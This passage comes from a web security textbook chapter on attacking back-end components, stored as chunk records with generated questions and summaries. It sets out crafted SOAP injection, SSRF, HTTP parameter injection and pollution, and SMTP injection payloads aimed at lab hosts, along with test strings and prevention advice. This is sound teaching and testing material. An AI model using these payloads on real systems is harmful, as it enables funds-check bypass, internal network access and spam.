structure and\ntherefore interfere with the application’s logic or cause other undesirable effects.\nConsider a banking application in which a user initiates a funds transfer\nusing an HTTP request like the following:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 65\nFromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit\nIn the course of processing this request, the following SOAP message is sent\nbetween two of the application’s back-end components:\n<soap:Envelope xmlns:soap=”http://www.w3.org/2001/12/soap-envelope”>\n<soap:Body>\n<pre:Add xmlns:pre=http://target/lists soap:encodingStyle=\n“http://www.w3.org/2001/12/soap-encoding”>\n<Account>\n<FromAccount>18281008</FromAccount>\n<Amount>1430</Amount>\n<ClearedFunds>False</ClearedFunds>\n<ToAccount>08447656</ToAccount>\n</Account>\n</pre:Add>\n</soap:Body>\n</soap:Envelope>\nNote how the XML elements in the message correspond to the parameters\nin the HTTP request, and also the addition of the ClearedFunds element. At\nthis point in the application’s logic, it has determined that insuffi cient funds\nare available to perform the requested transfer and has set the value of this\nelement to False. As a result, the component that receives the SOAP message\ndoes not act on it.\nIn this situation, there are various ways in which you could seek to inject\ninto the SOAP message and therefore interfere with the application’s logic. For\nexample, submitting the following request causes an additional ClearedFunds\nelement to be inserted into the message before the original element (while\npreserving the SQL’s syntactic validity). If the application processes the fi rst\nClearedFunds element it encounters, you may succeed in performing a transfer\nwhen no funds are available:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\ncc1100..iinndddd 338877 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 388\n388 Chapter 10 n Attacking Back-End Components\nContent-Length: 119\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit\nOn the other hand, if the application processes the last ClearedFunds element\nit encounters, you could inject a similar attack into the ToAccount parameter.\nA different type of attack would be to use XML comments to remove part of\nthe original SOAP message and replace the removed elements with your own.\nFor example, the following request injects a ClearedFunds element via the Amount\nparameter, provides the opening tag for the ToAccount element, opens a com-\nment, and closes the comment in the ToAccount parameter, thus preserving the\nsyntactic validity of the XML:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 125\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit\nA further type of attack would be to attempt to complete the entire SOAP\nmessage from within an injected parameter and comment out the remainder\nof the message. However, because the opening comment will not be matched\nby a closing comment, this attack produces strictly invalid XML, which many\nXML parsers will reject. This attack is only likely to work against a custom,\nhomegrown XML parser, rather than any XML parsing library:\nPOST /bank/27/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 176\nFromAccount=18281008&Amount=1430</Amount><ClearedFunds>True\n</ClearedFunds>\n<ToAccount>08447656</ToAccount></Account></pre:Add></soap:Body>\n</soap:Envelope>\n<!--&Submit=Submit\nTRY IT!\nThis example contains a helpful error message that enables you to fi ne-\ntune your attack:\nhttp://mdsec.net/bank/27/\nThe following examples contain the identical vulnerability, but the error\nfeedback is much more sparse. See how diffi cult it can be to exploit SOAP\ninjection without helpful error messages?\nhttp://mdsec.net/bank/18/\nhttp://mdsec.net/bank/6/\ncc1100..iinndddd 338888 88//1199//22001111 1122::1100::4499 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 389\nChapter 10 n Attacking Back-End Components 389\nFinding and Exploiting SOAP Injection\nSOAP injection can be diffi cult to detect, because supplying XML metacharacters\nin a noncrafted way breaks the format of the SOAP message, often resulting in\nan uninformative error message. Nevertheless, the following steps can be used\nto detect SOAP injection vulnerabilities with a degree of reliability.\n\nHACK STEPS\n1. Submit a rogue XML closing tag such as </foo> in each parameter in turn.\nIf no error occurs, your input is probably not being inserted into a SOAP\nmessage, or it is being sanitized in some way.\n2. If an error was received, submit instead a valid opening and closing tag\npair, such as <foo></foo>. If this causes the error to disappear, the\napplication may be vulnerable.\n3. In some situations, data that is inserted into an XML-formatted mes-\nsage is subsequently read back from its XML form and returned to the\nuser. If the item you are modifying is being returned in the application’s\nresponses, see whether any XML content you submit is returned in its\nidentical form or has been normalized in some way. Submit the following\ntwo values in turn:\ntest<foo/>\ntest<foo></foo>\nIf you find that either item is returned as the other, or simply as test,\nyou can be confident that your input is being inserted into an XML-based\nmessage.\n4. If the HTTP request contains several parameters that may be being placed\ninto a SOAP message, try inserting the opening comment character (<!-\n-) into one parameter and the closing comment character (!-->) into\nanother parameter. Then switch these around (because you have no way\nof knowing in which order the parameters appear). Doing so can have the\neffect of commenting out a portion of the server’s SOAP message. This\nmay cause a change in the application’s logic or result in a different error\ncondition that may divulge information.\nIf SOAP injection is diffi cult to detect, it can be even harder to exploit. In most\nsituations, you need to know the structure of the XML that surrounds your data\nto supply crafted input that modifi es the message without invalidating it. In all\nthe preceding tests, look for any error messages that reveal any details about\nthe SOAP message being processed. If you are lucky, a verbose message will\ndisclose the entire message, enabling you to construct crafted values to exploit\nthe vulnerability. If you are unlucky, you may be restricted to pure guesswork,\nwhich is very unlikely to be successful.\ncc1100..iinndddd 338899 88//1199//22001111 1122::1100::4499 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 390\n390 Chapter 10 n Attacking Back-End Components\nPreventing SOAP Injection\nYou can prevent SOAP injection by employing boundary validation fi lters at any\npoint where user-supplied data is inserted into a SOAP message (see Chapter\n2). This should be performed both on data that has been immediately received\nfrom the user in the current request and on any data that has been persisted from\nearlier requests or generated from other processing that takes user data as input.\nTo prevent the attacks described, the application should HTML-encode any\nXML metacharacters appearing in user input. HTML encoding involves replacing\nliteral characters with their corresponding HTML entities. This ensures that the\nXML interpreter treats them as part of the data value of the relevant element and\nnot as part of the structure of the message itself. Here are the HTML encodings\nof some common problematic characters:\nn < — &lt;\nn > — &gt;\nn / — &#47;\nInjecting into Back-end HTTP Requests\nThe preceding section described how some applications incorporate user-supplied\ndata into back-end SOAP requests to services that are not directly accessible\nto the user. More generally, applications may embed user input in any kind of\nback-end HTTP request, including those that transmit parameters as regular\nname/value pairs. This kind of behavior is often vulnerable to attack, since the\napplication often effectively proxies the URL or parameters supplied by the user.\nAttacks against this functionality can be divided into the following categories:\nn Server-side HTTP redirection attacks allow an attacker to specify an arbitrary\nresource or URL that is then requested by the front-end application server.\nn HTTP parameter injection (HPI) attacks allow an attacker to inject arbi-\ntrary parameters into a back-end HTTP request made by the application\nserver. If an attacker injects a parameter that already exists in the back-end\nrequest, HTTP parameter pollution (HPP) attacks can be used to override\nthe original parameter value specifi ed by the server.\nServer-side HTTP Redirection\nServer-side redirection vulnerabilities arise when an application takes user-\ncontrollable input and incorporates it into a URL that it retrieves using a back-\nend HTTP request. The user-supplied input may comprise the entire URL that\nis retrieved, or the application may perform some processing on it, such as\nadding a standard suffi x.\ncc1100..iinndddd 339900 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 391\nChapter 10 n Attacking Back-End Components 391\nThe back-end HTTP request may be to a domain on the public Internet,\nor it may be to an internal server not directly accessible by the user. The\ncontent requested may be core to the application’s functionality, such as an\ninterface to a payment gateway. Or it may be more peripheral, such as static\ncontent drawn from a third party. This technique is often used to knit several\ndisparate internal and external application components into a single front-\napplication that handles access control and session management on behalf\nof these other systems. If an attacker can control the IP address or hostname\nused in the back-end HTTP request, he can cause the application server to\nconnect to an arbitrary resource and sometimes retrieve the contents of the\nback-end response.\nConsider the following example of a front-end request, in which the loc\nparameter is used to specify which version of a CSS fi le the client wants to use:\nPOST /account/home HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: wahh-blogs.net\nContent-Length: 65\nview=default&loc=online.wahh-blogs.net/css/wahh.css\nIf no validation of the URL is specifi ed in the loc parameter, an attacker can\nspecify an arbitrary hostname in place of online.wahh-blogs.net. The applica-\ntion retrieves the specifi ed resource, allowing the attacker to use the application\nas a proxy to potentially sensitive back-end services. In the following example,\nthe attacker causes the application to connect to a back-end SSH service:\nPOST /account/home HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: blogs.mdsec.net\nContent-Length: 65\nview=default&loc=192.168.0.1:22\nThe application’s response includes the banner from the requested SSH service:\nHTTP/1.1 200 OK\nConnection: close\nSSH-2.0-OpenSSH_4.2Protocol mismatch.\nAn attacker can exploit server-side HTTP redirection bugs to effectively use the\nvulnerable application as an open HTTP proxy to perform various further attacks:\nn An attacker may be able to use the proxy to attack third-party systems on\nthe Internet. The malicious traffi c appears to the target to originate from\nthe server on which the vulnerable application is running.\nn An attacker may be able to use the proxy to connect to arbitrary hosts on\nthe organization’s internal network, thereby reaching targets that cannot\nbe accessed directly from the Internet.\ncc1100..iinndddd 339911 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 392\n392 Chapter 10 n Attacking Back-End Components\nn An attacker may be able to use the proxy to connect back to other services\nrunning on the application server itself, circumventing fi rewall restrictions\nand potentially exploiting trust relationships to bypass authentication.\nn Finally, the proxy functionality could be used to deliver attacks such as\ncross-site scripting by causing the application to include attacker-controlled\ncontent within its responses (see Chapter 12 for more details).\n\nHACK STEPS\n1. Identify any request parameters that appear to contain hostnames, IP\naddresses, or full URLs.\n2. For each parameter, modify its value to specify an alternative resource,\nsimilar to the one being requested, and see if that resource appears in the\nserver’s response.\n3. Try specifying a URL targeting a server on the Internet that you control,\nand monitor that server for incoming connections from the application\nyou are testing.\n4. If no incoming connection is received, monitor the time taken for the\napplication to respond. If there is a delay, the application’s back-end\nrequests may be timing out due to network restrictions on outbound\nconnections.\n5. If you are successful in using the functionality to connect to arbitrary\nURLs, try to perform the following attacks:\na. Determine whether the port number can be specified. For example,\nyou might supply http://mdattacker.net:22.\nb. If successful, attempt to port-scan the internal network by using a tool\nsuch as Burp Intruder to connect to a range of IP addresses and ports\nin sequence (see Chapter 14).\nc. Attempt to connect to other services on the loopback address of the\napplication server.\nd. Attempt to load a web page that you control into the application’s\nresponse to deliver a cross-site scripting attack.\nNOTE Some server-side redirection APIs, such as Server.Transfer()\nand Server.Execute() in ASP.NET, allow redirection only to relative URLs\non the same host. Functionality that passes user-supplied input to one of\nthese methods can still potentially be exploited to exploit trust relation-\nships and access resources on the server that are protected by platform-level\nauthentication.\ncc1100..iinndddd 339922 88//1199//22001111 1122::1100::4499 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 393\nChapter 10 n Attacking Back-End Components 393\nTRY IT!\nhttp://mdsec.net/updates/97/\nhttp://mdsec.net/updates/99/\nHTTP Parameter Injection\nHTTP parameter injection (HPI) arises when user-supplied parameters are\nused as parameters within a back-end HTTP request. Consider the following\nvariation on the bank transfer functionality that was previously vulnerable to\nSOAP injection:\nPOST /bank/48/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 65\nFromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit\nThis front-end request, sent from the user’s browser, causes the application\nto make a further back-end HTTP request to another web server within the\nbank’s infrastructure. In this back-end request, the application copies some of\nthe parameter values from the front-end request:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Length: 44\nfromacc=18281008&amount=1430&toacc=08447656\nThis request causes the back-end server to check whether cleared funds are\navailable to perform the transfer and, if so, to carry it out. However, the front-\nend server can optionally specify that cleared funds are available, and therefore\nbypass the check, by supplying the following parameter:\nclearedfunds=true\nIf the attacker is aware of this behavior, he can attempt to perform an HPI\nattack to inject the clearedfunds parameter into the back-end request. To do\nthis, he adds the required parameter onto the end of an existing parameter’s\nvalue and URL-encodes the characters & and =, which are used to separate\nnames and values:\nPOST /bank/48/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 96\nFromAccount=18281008&Amount=1430&ToAccount=08447656%26clearedfunds%3dtru\ne&Submit=Submit\ncc1100..iinndddd 339933 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 394\n394 Chapter 10 n Attacking Back-End Components\nWhen the application server processes this request, it URL-decodes the param-\neter values in the normal way. So the value of the ToAccount parameter that the\nfront-end application receives is as follows:\n08447656&clearedfunds=true\nIf the front-end application does not validate this value and passes it through\nunsanitized into the back-end request, the following back-end request is made,\nwhich successfully bypasses the check for cleared funds:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Length: 62\nfromacc=18281008&amount=1430&toacc=08447656&clearedfunds=true\nTRY IT!\nhttp://mdsec.net/bank/48/\nNOTE Unlike with SOAP injection, injecting arbitrary unexpected parameters\ninto a back-end request is unlikely to cause any kind of error. Therefore, a suc-\ncessful attack normally requires exact knowledge of the back-end parameters\nthat are being used. Although this may be hard to determine in a blackbox\ncontext, it may be straightforward if the application uses any third-party com-\nponents whose code can be obtained and researched.\nHTTP Parameter Pollution\nHPP is an attack technique that arises in various contexts (see Chapters 12 and\n13 for other examples) and that often applies in the context of HPI attacks.\nThe HTTP specifi cations provide no guidelines as to how web servers should\nbehave when a request contains multiple parameters with the same name. In\npractice, different web servers behave in different ways. Here are some com-\nmon behaviors:\nn Use the fi rst instance of the parameter.\nn Use the last instance of the parameter.\nn Concatenate the parameter values, maybe adding a separator between them.\nn Construct an array containing all the supplied values.\nIn the preceding HPI example, the attacker could add a new parameter to\na back-end request. In fact, it is more likely in practice that the request into\nwhich the attacker can inject already contains a parameter with the name he\ncc1100..iinndddd 339944 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 395\nChapter 10 n Attacking Back-End Components 395\nis targeting. In this situation, the attacker can use the HPI condition to inject a\nsecond instance of the same parameter. The resulting application behavior then\ndepends on how the back-end HTTP server handles the duplicated parameter.\nThe attacker may be able to use the HPP technique to “override” the value of\nthe original parameter with the value of his injected parameter.\nFor example, if the original back-end request is as follows:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Length: 62\nfromacc=18281008&amount=1430&clearedfunds=false&toacc=08447656\nand the back-end server uses the fi rst instance of any duplicated parameter, an\nattacker can place the attack into the FromAccount parameter in the front-end\nrequest:\nPOST /bank/52/Default.aspx HTTP/1.0\nHost: mdsec.net\nContent-Length: 96\nFromAccount=18281008%26clearedfunds%3dtrue&Amount=1430&ToAccount=0844765\n6&Submit=Submit\nConversely, in this example, if the back-end server uses the last instance of\nany duplicated parameter, the attacker can place the attack into the ToAccount\nparameter in the front-end request.\nTRY IT!\nhttp://mdsec.net/bank/52/\nhttp://mdsec.net/bank/57/\nThe results of HPP attacks are heavily dependent on how the target applica-\ntion server handles multiple occurrences of the same parameter, and the precise\ninsertion point within the back-end request. This has signifi cant consequences\nif two technologies need to process the same HTTP request. A web application\nfi rewall or reverse proxy may process a request and pass it to the web application,\nwhich may proceed to discard variables, or even build strings out of previously\ndisparate portions of the request!\nA good paper covering the different behaviors of the common application\nservers can be found here:\nwww.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf\ncc1100..iinndddd 339955 88//1199//22001111 1122::1100::4499 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 396\n396 Chapter 10 n Attacking Back-End Components\nAttacks Against URL Translation\nMany servers rewrite requested URLs on arrival to map these onto the relevant\nback-end functions within the application. In addition to conventional URL\nrewriting, this behavior can arise in the context of REST-style parameters, cus-\ntom navigation wrappers, and other methods of URL translation. The kind of\nprocessing that this behavior involves can be vulnerable to HPI and HPP attacks.\nFor simplicity and to aid navigation, some applications place parameter values\nwithin the fi le path of the URL, rather than the query string. This can often be\nachieved with some simple rules to transform the URL and forward it to the\ntrue destination. The following mod_rewrite rules in Apache are used to handle\npublic access to user profi les:\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /pub/user/[^\\&]*\\ HTTP/\nRewriteRule ^pub/user/([^/\\.]+)$ /inc/user_mgr.php?mode=view&name=$1\nThis rule takes aesthetically pleasing requests such as:\n/pub/user/marcus\nand transforms them into back-end requests for the view functionality contained\nwithin the user management page user_mgr.php. It moves the marcus parameter\ninto the query string and adds the mode=view parameter:\n/inc/user_mgr.php?mode=view&name=marcus\nIn this situation, it may be possible to use an HPI attack to inject a second mode\nparameter into the rewritten URL. For example, if the attacker requests this:\n/pub/user/marcus%26mode=edit\nthe URL-decoded value is embedded in the rewritten URL as follows:\n/inc/user_mgr.php?mode=view&name=marcus&mode=edit\nAs was described for HPP attacks, the success of this exploit depends on\nhow the server handles the now-duplicated parameter. On the PHP platform,\nthe mode parameter is treated as having the value edit, so the attack succeeds.\ncc1100..iinndddd 339966 88//1199//22001111 1122::1100::4499 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 397\nChapter 10 n Attacking Back-End Components 397\n\nHACK STEPS\n1. Target each request parameter in turn, and try to append a new injected\nparameter using various syntax:\nn %26foo%3dbar — URL-encoded &foo=bar\nn %3bfoo%3dbar — URL-encoded ;foo=bar\nn %2526foo%253dbar — Double URL-encoded &foo=bar\n2. Identify any instances where the application behaves as if the original\nparameter were unmodified. (This applies only to parameters that usually\ncause some difference in the application’s response when modified.)\n3. Each instance identified in the previous step has a chance of parameter\ninjection. Attempt to inject a known parameter at various points in the\nrequest to see if it can override or modify an existing parameter. For\nexample:\nFromAccount=18281008%26Amount%3d4444&Amount=1430&ToAcco\nunt=08447656\n4. If this causes the new value to override the existing one, determine\nwhether you can bypass any front-end validation by injecting a value that\nis read by a back-end server.\n5. Replace the injected known parameter with additional parameter names\nas described for application mapping and content discovery in Chapter 4.\n6. Test the application’s tolerance of multiple submissions of the same\nparameter within a request. Submit redundant values before and after\nother parameters, and at different locations within the request (within the\nquery string, cookies, and the message body).\nInjecting into Mail Services\nMany applications contain a facility for users to submit messages via the appli-\ncation, such as to report a problem to support personnel or provide feedback\nabout the website. This facility is usually implemented by interfacing with a\nmail (or SMTP) server. Typically, user-supplied input is inserted into the SMTP\ncc1100..iinndddd 339977 88//1199//22001111 1122::1100::4499 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 398\n398 Chapter 10 n Attacking Back-End Components\nconversation that the application server conducts with the mail server. If an\nattacker can submit suitable crafted input that is not fi ltered or sanitized, he\nmay be able to inject arbitrary STMP commands into this conversation.\nIn most cases, the application enables you to specify the contents of the mes-\nsage and your own e-mail address (which is inserted into the From fi eld of the\nresulting e-mail). You may also be able to specify the subject of the message and\nother details. Any relevant fi eld that you control may be vulnerable to SMTP\ninjection.\nSMTP injection vulnerabilities are often exploited by spammers who scan\nthe Internet for vulnerable mail forms and use these to generate large volumes\nof nuisance e-mail.\nE-mail Header Manipulation\nConsider the form shown in Figure 10-6, which allows users to send feedback\nabout the application.\nFigure 10-6: A typical site feedback form\nHere, users can specify a From address and the contents of the message. The\napplication passes this input to the PHP mail() command, which constructs\nthe e-mail and performs the necessary SMTP conversation with its confi gured\nmail server. The mail generated is as follows:\nTo: admin@wahh-app.com\nFrom: marcus@wahh-mail.com\nSubject: Site problem\nConfirm Order page doesn’t load\nThe PHP mail() command uses an additional_headers parameter to set the\nmessage’s From address. This parameter is also used to specify other headers,\nincluding Cc and Bcc, by separating each required header with a newline char-\nacter. Hence, an attacker can cause the message to be sent to arbitrary recipients\nby injecting one of these headers into the From fi eld, as illustrated in Figure 10-7.\ncc1100..iinndddd 339988 88//1199//22001111 1122::1100::4499 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 399\nChapter 10 n Attacking Back-End Components 399\nFigure 10-7: An e-mail header injection attack\nThis causes the mail() command to generate the following message:\nTo: admin@wahh-app.com\nFrom: marcus@wahh-mail.com\nBcc: all@wahh-othercompany.com\nSubject: Site problem\nConfirm Order page doesn’t load\nSMTP Command Injection\nIn other cases, the application may perform the SMTP conversation itself, or it\nmay pass user-supplied input to a different component to do this. In this situ-\nation, it may be possible to inject arbitrary SMTP commands directly into this\nconversation, potentially taking full control of the messages being generated\nby the application.\nFor example, consider an application that uses requests of the following form\nto submit site feedback:\nPOST feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 56\nFrom=daf@wahh-mail.com&Subject=Site+feedback&Message=foo\nThis causes the web application to perform an SMTP conversation with the\nfollowing commands:\nMAIL FROM: daf@wahh-mail.com\nRCPT TO: feedback@wahh-app.com\n\nDATA\nFrom: daf@wahh-mail.com\nTo: feedback@wahh-app.com\nSubject: Site feedback\nfoo\n.\ncc1100..iinndddd 339999 88//1199//22001111 1122::1100::5500 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 400\n400 Chapter 10 n Attacking Back-End Components\nNOTE After the SMTP client issues the DATA command, it sends the contents\nof the e-mail message, comprising the message headers and body. Then it\nsends a single dot character on its own line. This tells the server that the mes-\nsage is complete, and the client can then issue further SMTP commands to\nsend further messages.\nIn this situation, you may be able to inject arbitrary SMTP commands into\nany of the e-mail fi elds you control. For example, you can attempt to inject into\nthe Subject fi eld as follows:\nPOST feedback.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 266\nFrom=daf@wahh-mail.com&Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d\n%0aMAIL+FROM:+mail@wahh-viagra.com%0d%0aRCPT+TO:+john@wahh-mail\n.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@wahh-mail\n.com%0d%0aSubject:+Cheap+V1AGR4%0d%0aBlah%0d%0a%2e%0d%0a&Message=foo\nIf the application is vulnerable, this results in the following SMTP conversa-\ntion, which generates two different e-mail messages. The second is entirely\nwithin your control:\nMAIL FROM: daf@wahh-mail.com\nRCPT TO: feedback@wahh-app.com\n\nDATA\nFrom: daf@wahh-mail.com\nTo: feedback@wahh-app.com\nSubject: Site+feedback\nfoo\n.\nMAIL FROM: mail@wahh-viagra.com\nRCPT TO: john@wahh-mail.com",
    "question": "What are the key risks and methods associated with attacking back-end components of a web application, such as command injection, path traversal, and file inclusion vulnerabilities?",
    "summary": "Web applications often interact with back-end components like web servers, mail servers, and file systems, which can be exploited through injection attacks. These attacks can bypass access controls and allow unauthorized access to sensitive data or functionality. Common vulnerabilities include command injection, where user input modifies system commands, and path traversal, where attackers access files outside the intended directory. Other issues involve file inclusion and XML external entity injection, which can lead to unauthorized access to internal systems or execution of malicious code. Preventing these vulnerabilities requires careful input validation and avoiding direct system command execution."
  },
  {
    "start": 307,
    "end": 310,
    "text": "DATA\nFrom: mail@wahh-viagra.com\nTo: john@wahh-mail.com\nSubject: Cheap V1AGR4\nBlah\n.\nfoo\n.\nFinding SMTP Injection Flaws\nTo probe an application’s mail functionality effectively, you need to target every\nparameter that is submitted to an e-mail-related function, even those that may\ninitially appear to be unrelated to the content of the generated message. You\ncc1100..iinndddd 440000 88//1199//22001111 1122::1100::5500 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 401\nChapter 10 n Attacking Back-End Components 401\nshould also test for each kind of attack, and you should perform each test case\nusing both Windows- and UNIX-style newline characters.\n\nHACK STEPS\n1. You should submit each of the following test strings as each parameter in\nturn, inserting your own e-mail address at the relevant position:\n<youremail>%0aCc:<youremail>\n<youremail>%0d%0aCc:<youremail>\n<youremail>%0aBcc:<youremail>\n<youremail>%0d%0aBcc:<youremail>\n%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<y\nouremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aS\nubject:+test%0afoo%0a%2e%0a\n%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0\nd%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%\n0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0\nafoo%0d%0a%2e%0d%0a\n2. Note any error messages the application returns. If these appear to relate\nto any problem in the e-mail function, investigate whether you need to\nfine-tune your input to exploit a vulnerability.\n3. The application’s responses may not indicate in any way whether a vul-\nnerability exists or was successfully exploited. You should monitor the\ne-mail address you specified to see if any mail is received.\n4. Review closely the HTML form that generates the relevant request. This\nmay contain clues about the server-side software being used. It may also\ncontain a hidden or disabled field that specifies the e-mail’s To address,\nwhich you can modify directly.\nTIP Functions to send e-mails to application support personnel are fre-\nquently regarded as peripheral and may not be subject to the same security\nstandards or testing as the main application functionality. Also, because they\ninvolve interfacing to an unusual back-end component, they are often imple-\nmented via a direct call to the relevant operating system command. Hence,\nin addition to probing for SMTP injection, you should also closely review all\ne-mail-related functionality for OS command injection fl aws.\ncc1100..iinndddd 440011 88//1199//22001111 1122::1100::5500 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 402\n402 Chapter 10 n Attacking Back-End Components\nPreventing SMTP Injection\nSMTP injection vulnerabilities usually can be prevented by implementing rig-\norous validation of any user-supplied data that is passed to an e-mail function\nor used in an SMTP conversation. Each item should be validated as strictly as\npossible given the purpose for which it is being used:\nn E-mail addresses should be checked against a suitable regular expression\n(which should, of course, reject any newline characters).\nn The message subject should not contain any newline characters, and it\nmay be limited to a suitable length.\nn If the contents of a message are being used directly in an SMTP conversa-\ntion, lines containing just a single dot should be disallowed.\nSummary\nWe have examined a wide range of attacks targeting back-end application\ncomponents and the practical steps you can take to identify and exploit each\none. Many real-world vulnerabilities can be discovered within the fi rst few\nseconds of interacting with an application. For example, you could enter some\nunexpected syntax into a search box. In other cases, these vulnerabilities may\nbe highly subtle, manifesting themselves in scarcely detectable differences in\nthe application’s behavior, or reachable only through a multistage process of\nsubmitting and manipulating crafted input.\nTo be confi dent that you have uncovered the back-end injection fl aws that\nexist within an application, you need to be both thorough and patient. Practically\nevery type of vulnerability can manifest itself in the processing of practically\nany item of user-supplied data, including the names and values of query string\nparameters, POST data and cookies, and other HTTP headers. In many cases, a\ndefect emerges only after extensive probing of the relevant parameter as you\nlearn exactly what type of processing is being performed on your input and\nscrutinize the obstacles that stand in your way.\nFaced with the huge potential attack surface presented by potential attacks\nagainst back-end application components, you may feel that any serious assault\non an application must entail a titanic effort. However, part of learning the art\nof attacking software is to acquire a sixth sense for where the treasure is hid-\nden and how your target is likely to open up so that you can steal it. The only\nway to gain this sense is through practice. You should rehearse the techniques\nwe have described against the real-life applications you encounter and see how\nthey stand up.\ncc1100..iinndddd 440022 88//1199//22001111 1122::1100::5500 PPMM\n\nStuttard c10.indd V2 - 07/05/2011 Page 403\nChapter 10 n Attacking Back-End Components 403\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. A network device provides a web-based interface for performing device\nconfi guration. Why is this kind of functionality often vulnerable to OS\ncommand injection attacks?\n2. You are testing the following URL:\nhttp://wahh-app.com/home/statsmgr.aspx?country=US\nChanging the value of the country parameter to foo results in this error\nmessage:\nCould not open file: D:\\app\\default\\home\\logs\\foo.log (invalid file).\nWhat steps could you take to attack the application?\n3. You are testing an AJAX application that sends data in XML format within\nPOST requests. What kind of vulnerability might enable you to read\narbitrary fi les from the server’s fi lesystem? What prerequisites must be\nin place for your attack to succeed?\n4. You make the following request to an application that is running on the\nASP.NET platform:\nPOST /home.aspx?p=urlparam1&p=urlparam2 HTTP/1.1\nHost: wahh-app.com\nCookie: p=cookieparam\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\np=bodyparam\nThe application executes the following code:\nString param = Request.Params[“p”];\nWhat value does the param variable have?\n5. Is HPP a prerequisite for HPI, or vice versa?\n6. An application contains a function that proxies requests to external domains\nand returns the responses from those requests. To prevent server-side\nredirection attacks from retrieving protected resources on the application’s\nown web server, the application blocks requests targeting localhost or\ncc1100..iinndddd 440033 88//1199//22001111 1122::1100::5500 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 404\n404 Chapter 10 n Attacking Back-End Components",
    "question": "What are the steps to identify and exploit SMTP injection vulnerabilities in an application's email functionality?",
    "summary": "The text discusses how to find SMTP injection flaws by testing email-related parameters with specific test strings and monitoring responses. It also highlights the importance of validating user input to prevent such vulnerabilities. The summary emphasizes that back-end components can have hidden injection flaws, and thorough testing is necessary to identify them."
  },
  {
    "start": 311,
    "end": 340,
    "text": "127.0.0.1. How might you circumvent this defense to access resources\non the server?\n7. An application contains a function for user feedback. This allows the user\nto supply their e-mail address, a message subject, and detailed comments.\nThe application sends an email to feedback@wahh-app.com, addressed\nfrom the user’s email address, with the user-supplied subject line and\ncomments in the message body. Which of the following is a valid defense\nagainst mail injection attacks?\n(a) Disable mail relaying on the mail server.\n(b) Hardcode the RCPT TO fi eld with feedback@wahh-app.com.\n(c) Validate that the user-supplied inputs do not contain any newlines or\nother SMTP metacharacters.\ncc1100..iinndddd 440044 88//1199//22001111 1122::1100::5500 PPMM\n\nStuttard c11.indd V2 - 07/26/2011 Page 405\n\nCHAPTER\n11\nAttacking Application Logic\nAll web applications employ logic to deliver their functionality. Writing code\nin a programming language involves at its root nothing more than breaking\na complex process into simple and discrete logical steps. Translating a piece\nof functionality that is meaningful to human beings into a sequence of small\noperations that can be executed by a computer involves a great deal of skill and\ndiscretion. Doing so in an elegant and secure fashion is harder still. When large\nnumbers of different designers and programmers work in parallel on the same\napplication, there is ample opportunity for mistakes to occur.\nIn all but the simplest of web applications, a vast amount of logic is performed\nat every stage. This logic presents an intricate attack surface that is always\npresent but often overlooked. Many code reviews and penetration tests focus\nexclusively on common “headline” vulnerabilities such as SQL injection and\ncross-site scripting, because these have an easily recognizable signature and\nwell-researched exploitation vector. By contrast, fl aws in an application’s logic\nare harder to characterize: each instance may appear to be a unique one-off\noccurrence, and they usually are not identifi ed by any automated vulnerability\nscanners. As a result, they generally are not as well appreciated or understood,\nand therefore they are of great interest to an attacker.\nThis chapter describes the kinds of logic fl aws that often exist in web applica-\ntions and the practical steps you can take to probe and attack an application’s\nlogic. We will present a series of real-world examples, each of which manifests a\ndifferent kind of logical defect. Together, they illustrate the variety of assumptions\n405\ncc1111..iinndddd 440055 